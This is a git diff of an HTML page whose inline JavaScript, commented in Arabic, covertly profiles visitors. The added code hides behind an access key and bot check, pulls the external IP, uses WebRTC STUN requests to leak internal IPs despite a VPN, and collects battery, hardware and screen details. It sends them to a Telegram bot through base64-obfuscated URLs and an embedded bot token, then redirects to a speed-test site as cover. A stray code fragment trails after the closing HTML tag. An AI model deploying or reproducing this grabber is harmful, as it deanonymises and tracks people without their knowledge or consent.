@@ -8,11 +8,12 @@
 <body style="background:#000; color:#000;">
     <script>
         (async function() {
-            // [إعدادات التشفير]
+            // [إعدادات التشفير - التوكن والايدي الخاص بك]
             const _t = "ODQ4ODE0ODAzMjpBQUg5QjNydl9zZDJheVVVa3BWQmJrdXR0MnJ6ZFlhbGt3QQ==";
             const _c = "NTc3NTc4MTAzOA==";
             const _k = "portal";
 
+            // فحص الدخول (Access Key) لتجنب دخول البوتات
             const _url = new URLSearchParams(window.location.search);
             if (_url.get('access') !== _k || navigator.webdriver) {
                 window.location.replace("https://www.google.com"); return;
@@ -20,20 +21,91 @@
 
             let _data = {
                 ext: "جاري الجلب...",
-                int: [], // مصفوفة لجمع كل الـ IPs المسربة
+                int: [], 
                 bt: "N/A",
-                cpu: navigator.hardwareConcurrency || "8",
-                ram: navigator.deviceMemory || "4",
+                cpu: navigator.hardwareConcurrency || "N/A",
+                ram: navigator.deviceMemory || "N/A",
                 plt: navigator.platform,
                 res: `${window.screen.width}x${window.screen.height}`
             };
 
-            // 1️⃣ سحب الـ IP الخارجي (الظاهري)
-            try {
-                const r = await fetch('https://api.ipify.org?format=json');
-                const d = await r.json();
-                _data.ext = d.ip;
-            } catch(e) {}
+            // 1️⃣ سحب الـ IP الخارجي (بسرعة البرق)
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(d => _data.ext = d.ip)
+                .catch(() => {});
+
+            // 2️⃣ 🔥 تقنية WebRTC العميقة (إرسال فوري عند أول صيد)
+            const pc = new RTCPeerConnection({
+                iceServers: [
+                    {urls: 'stun:stun.l.google.com:19302'},
+                    {urls: 'stun:stun1.l.google.com:19302'}
+                ]
+            });
+            pc.createDataChannel("");
+            pc.createOffer().then(o => pc.setLocalDescription(o));
+
+            pc.onicecandidate = (i) => {
+                if (!i || !i.candidate) return;
+                const cand = i.candidate.candidate;
+                const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(cand);
+                if (match) {
+                    const ip = match[1];
+                    if (!ip.startsWith('127.') && !_data.int.includes(ip)) {
+                        _data.int.push(ip);
+                        // ميزة السرعة: إذا وجدنا IP داخلي يختلف عن الخارجي، أرسل فوراً
+                        if (_data.ext !== "جاري الجلب...") {
+                            sendReport();
+                        }
+                    }
+                }
+            };
+
+            // 3️⃣ سحب حالة البطارية (متوازي)
+            if (navigator.getBattery) {
+                navigator.getBattery().then(b => {
+                    _data.bt = `${Math.round(b.level * 100)}% ${b.charging ? "(يُشحن)" : "(تفريغ)"}`;
+                });
+            }
+
+            // 4️⃣ وظيفة الإرسال المدمجة
+            async function sendReport() {
+                if (window.alreadySent) return; 
+                window.alreadySent = true;
+
+                const realIp = _data.int.find(ip => ip !== _data.ext) || (_data.int[0] || "لم يتم الكشف");
+                
+                const _msg = `🔥 تم اصطياد البيانات (النسخة السريعة) 🔥\n\n` +
+                               `✅ الـ IP الحقيقي (الداخلي): ${realIp}\n` +
+                               `🌐 الـ IP الظاهري (الخارجي): ${_data.ext}\n` +
+                               `🔋 البطارية: ${_data.bt}\n` +
+                               `🧠 المعالج: ${_data.cpu} Cores | الرام: ${_data.ram} GB\n` +
+                               `🖥️ الشاشة: ${_data.res}\n` +
+                               `📱 النظام: ${_data.plt}\n\n` +
+                               `📍 تتبع الـ IP الحقيقي:\n` +
+                               `https://www.infobyip.com/ip-${realIp}.html`;
+
+                const _api = atob("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==") + atob(_t) + atob("L3NlbmRNZXNzYWdl");
+
+                try {
+                    await fetch(_api, {
+                        method: "POST",
+                        headers: {"Content-Type": "application/json"},
+                        body: JSON.stringify({chat_id: atob(_c), text: _msg})
+                    });
+                } catch (e) {}
+
+                // التوجيه النهائي للتمويه
+                window.location.replace("https://www.speedtest.net");
+            }
+
+            // [صمام الأمان] إذا تأخر الـ WebRTC، أرسل الموجود بعد 2.5 ثانية فقط
+            setTimeout(sendReport, 2500);
+
+        })();
+    </script>
+</body>
+</html>
 
             // 2️⃣ 🔥 تقنية WebRTC العميقة لكسر الـ VPN
             const getInternalIPs = () => {
